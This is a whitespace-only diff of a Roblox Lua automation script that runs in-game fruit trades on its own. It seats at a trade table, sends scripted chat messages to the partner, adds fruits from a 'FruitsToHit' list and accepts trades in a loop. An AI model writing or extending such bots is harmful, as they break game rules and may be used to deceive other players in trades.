@@ -1956,25 +2000,25 @@ local function tradeWithPlayer()
             break
         end
     end
-    
+
     if not mySeat then return false end
-    
+
     local otherSeat = mySeat.Name == "P1" and tradeTable.P2 or tradeTable.P1
     local startTime = tick()
     local result = false
-    
+
     local function checkTrade()
         if not isSeated() then
             task.wait(0.25)
             return not isSeated()
         end
-        
+
         local seatWeld = otherSeat:FindFirstChild("SeatWeld")
         if not seatWeld then return false end
-        
+
         local otherPlayer = Players:GetPlayerFromCharacter(seatWeld.Part1.Parent)
         if not otherPlayer then return false end
-        
+
         if not isInTradeWithCorrectPlayer() then
             task.wait(0.25)
             if isSeated() and not isInTradeWithCorrectPlayer() then
@@ -1982,26 +2026,26 @@ local function tradeWithPlayer()
             end
             return true
         end
-        
+
         if isInTradeWithCorrectPlayer() and isPlayerNearby(otherPlayer) then
             lastTradeTime = tick()
             result = otherPlayer
             return true
         end
-        
+
         return false
     end
-    
+
     while tick() - startTime < 30 and not result do
         if checkTrade() then break end
         task.wait(0.1)
     end
-    
+
     if isSeated() then
         error("wow")
         task.wait(0.5)
     end
-    
+
     return result
 end
 
@@ -2058,23 +2102,23 @@ local function handleTrade(tradingPlayer, remainingFruits)
     if not tradingPlayer or not isSeated() then return false end
 
     local tradeComplete = false
-    
+
     if not tradeAttempts[currentTradeIndex] then
         tradeAttempts[currentTradeIndex] = 0
     end
     tradeAttempts[currentTradeIndex] = tradeAttempts[currentTradeIndex] + 1
-    
+
     if #remainingFruits > 1 and tradeAttempts[currentTradeIndex] == 1 then
         sendTradeMessage("Hey! Let's do multiple trades for multiple fruits!")
         sendTradeMessage("Please, wait until I put in correct fruits.")
     end
-    
+
     local tradeValid = true
     local connection = game:GetService("RunService").Heartbeat:Connect(function()
         if not isPlayerNearby(tradingPlayer) then
             tradeValid = false
-            if isSeated() then 
-                forceJump() 
+            if isSeated() then
+                forceJump()
             end
             connection:Disconnect()
         end
@@ -2082,13 +2126,13 @@ local function handleTrade(tradingPlayer, remainingFruits)
 
     clearTradeItems()
     task.wait(1)
-    
+
     local currentFruit = remainingFruits[1]
     if currentFruit then
-        sendTradeMessage(string.format("Trade %d/%d - Adding %s", 
-            currentTradeIndex, math.ceil(#remainingFruits), 
+        sendTradeMessage(string.format("Trade %d/%d - Adding %s",
+            currentTradeIndex, math.ceil(#remainingFruits),
             currentFruit:gsub("-", " ")))
-        
+
         local fruitAdded = false
         local attempts = 0
         while not fruitAdded and attempts < 5 do
@@ -2098,7 +2142,7 @@ local function handleTrade(tradingPlayer, remainingFruits)
                 attempts = attempts + 1
             end
         end
-        
+
         task.wait(0.5)
         local currentItems = getCurrentTradeItems()
         for _, item in ipairs(currentItems) do
@@ -2108,13 +2152,13 @@ local function handleTrade(tradingPlayer, remainingFruits)
                 break
             end
         end
-        
+
         if fruitAdded then
             local startTime = tick()
             while isSeated() and tradeValid and tick() - startTime < 600 do
                 acceptTrade()
                 task.wait(0.1)
-                
+
                 local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
                 if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
                     if wasTradeSuccessful(currentFruit) then
@@ -2125,25 +2169,25 @@ local function handleTrade(tradingPlayer, remainingFruits)
             end
         end
     end
-    
+
     connection:Disconnect()
-    
+
     if tradeComplete then
         currentTradeIndex = (currentTradeIndex >= math.ceil(#remainingFruits)) and 1 or currentTradeIndex + 1
         if currentTradeIndex == 1 then
             tradeAttempts = {}
         end
     end
-    
+
     return tradeComplete
 end
 
 game:GetService("RunService").Heartbeat:Connect(function()
     if not isRunning then return end
-    
+
     local tradingPlayer = tradeWithPlayer()
     if not tradingPlayer then return end
-    
+
     local remainingFruits = {}
     for i = currentTradeIndex, #trades do
         for _, fruit in ipairs(trades[i]) do
@@ -2155,13 +2199,13 @@ game:GetService("RunService").Heartbeat:Connect(function()
             end
         end
     end
-    
+
     if #remainingFruits == 0 then
         currentTradeIndex = 1
         tradeAttempts = {}
         trades = splitFruitsIntoTrades(FruitsToHit)
         return
     end
-    
+
     handleTrade(tradingPlayer, remainingFruits)
 end)
